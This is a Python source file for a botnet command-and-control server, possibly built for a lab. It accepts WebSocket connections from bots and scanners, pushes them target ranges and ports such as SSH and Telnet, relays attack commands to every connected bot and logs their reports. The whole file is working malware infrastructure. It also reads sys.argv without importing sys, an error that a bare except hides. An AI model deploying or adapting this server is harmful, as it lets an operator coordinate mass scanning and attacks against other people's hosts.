import os
import json
import time
import socket
import asyncio
import websockets
import logging
import random
import signal
from datetime import datetime

signal.signal(signal.SIGHUP, signal.SIG_IGN)


logging.basicConfig(level=logging.INFO, filename='log_cnc.log', filemode='a', format='%(name)s - %(asctime)s - %(levelname)s  - %(message)s')

now = datetime.now()

MOD_PORT = 4567
SCANNER = 'scan'
ATTACK = 'attack'
start=1

try:
    end=int(sys.argv[1])
except:
    end=3

IPS=''
for i in range(start, end+1):
    IPS+='172.16.'+str(i)+'.0/28,'

IPS = IPS[:-1]
FREQ = 1

GUI_CONN = {
            SCANNER: {'ws': None, 'connected': False, 'handles':{}, 'init': {'frequency': FREQ, 'ip': IPS, 'port': '22,23,2323,443,80, 8080'}},
            ATTACK: {'ws': None, 'connected': False, 'handles':{}, 'init': {'frequency': FREQ, 'ip': IPS, 'port': '22'}}
            }

# This msg is sent as soon as a new bot or scanner connects to cnc.
async def send_init_msg(conn, i_type):

    try:
        temp_msg = {'event': 'EVT_INIT', 'data' : GUI_CONN[i_type]['init']}
    except:
        logging.error("Invalid type in send_init_msg.")
        return

    await conn.send(json.dumps(temp_msg))

# This msg is sent to all the connected bots or scanners.
async def command_to_device(i_msg, i_type):      

    try:
        handler = GUI_CONN[i_type]['handles']
    except:
        logging.error("Invalid type in command_to_device.")
        return

    o_msg = {'event': i_msg['event'], 'data': None}
    del i_msg['event']
    o_msg['data'] = i_msg

    for a_handle in handler.values():
        await a_handle.send(json.dumps(o_msg))

# Routine to update the GUI.
async def update_GUI():
        global  GUI_CONN
        
        for a_module in GUI_CONN:
            if GUI_CONN[a_module]['connected']:
                temp_msg = {'event':'EVT_UPDATE', 'count': len(GUI_CONN[a_module]['handles'])}
                await GUI_CONN[a_module]['ws'].send(json.dumps(temp_msg))
            else:
                logging.debug('GUI not connected.')

# Process msg. 
async def process_msg(msg, module):
    global GUI_CONN
    msg = json.loads(msg)

    if not 'event' in msg.keys():
        logging.error("Event not in the message.")
        return

    event = msg['event']

    if event == "EVT_ATTACK":       
        await command_to_device(msg, ATTACK)
    elif event == "EVT_SETUP_A":
        GUI_CONN[ATTACK]['init']['frequency'] = msg['frequency']
        GUI_CONN[ATTACK]['init']['ip'] = msg['ip']
        GUI_CONN[ATTACK]['init']['port'] = msg['port']
        msg['event'] = "EVT_SETUP"
        await command_to_device(msg, ATTACK)
    elif event == "EVT_SETUP_S":
        GUI_CONN[SCANNER]['init']['frequency'] = msg['frequency']
        GUI_CONN[SCANNER]['init']['ip'] = msg['ip']
        GUI_CONN[SCANNER]['init']['port'] = msg['port']
        msg['event'] = "EVT_SETUP"
        await command_to_device(msg, SCANNER)
    elif event == "EVT_REPORT":
        logging.info(msg)
    else:
        logging.error("Unknown event {} received.".format(event))

# Receiver events.
async def recv_module_event(websocket, path):
    global GUI_CONN
    module = os.path.basename(path)
    logging.info('Module: {}, address: {} connected.'.format(module, websocket.remote_address))

    if not ( module == SCANNER or  module == ATTACK):
        if module.find('bot_') >= 0:
            GUI_CONN[ATTACK]['handles'][module] = websocket
            await send_init_msg(websocket, ATTACK)
        elif module.find('scanner_') >= 0:
            GUI_CONN[SCANNER]['handles'][module] = websocket
            await send_init_msg(websocket, SCANNER)
        
        await update_GUI()
    else:
        GUI_CONN[module]['connected'] = True
        GUI_CONN[module]['ws'] = websocket

    try:
        while(True) :
            msg = await websocket.recv()
            logging.debug("Received msg {}".format(msg))
            await process_msg(msg, websocket)

    except websockets.exceptions.ConnectionClosed:
        if module.find('bot_')>=0:
            del GUI_CONN[ATTACK]['handles'][module]
            await update_GUI()
        elif module.find('scanner_')>=0:
            del GUI_CONN[SCANNER]['handles'][module]
            await update_GUI()
        else:    
            GUI_CONN[module]['ws'] = None
            GUI_CONN[module]['connected'] = False
            
            
        logging.info("{} connection closed.".format(module))
        

EVENT_LOOP = asyncio.get_event_loop()

task = websockets.serve(recv_module_event, '0.0.0.0', MOD_PORT)
EVENT_LOOP.run_until_complete(task)

try:
    logging.info('Started CnC Server at {}.'.format(now.strftime("%d/%m/%Y %H:%M:%S")))
    EVENT_LOOP.run_forever()
except KeyboardInterrupt:
    pass
finally:
    logging.info('CnC Server stopped !!! at {}.'.format(now.strftime("%d/%m/%Y %H:%M:%S")))
